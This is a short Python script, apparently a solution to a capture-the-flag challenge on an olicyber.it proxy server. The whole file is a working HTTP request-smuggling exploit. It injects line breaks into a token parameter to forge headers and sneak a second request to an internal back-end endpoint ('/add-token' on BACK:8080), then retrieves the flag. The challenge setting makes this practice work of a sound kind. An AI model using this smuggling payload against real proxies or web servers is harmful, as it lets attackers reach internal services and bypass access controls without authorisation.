import requests, json

url = 'http://flag-proxy.challs.olicyber.it/'
token = 'passwordMagica'

#HTTP Smuggling

exploit = f"""{token}
Content-Length: 0
Connection: Keep-Alive

GET /add-token?token={token} HTTP/1.1
Host: http://BACK:8080/
Connection: Keep-Alive
Authorization: Bearer {token}
"""

requests.get(f'{url}/flag?token={exploit}')

print(json.loads(requests.get(f'{url}/flag?token={token}').text)['body'])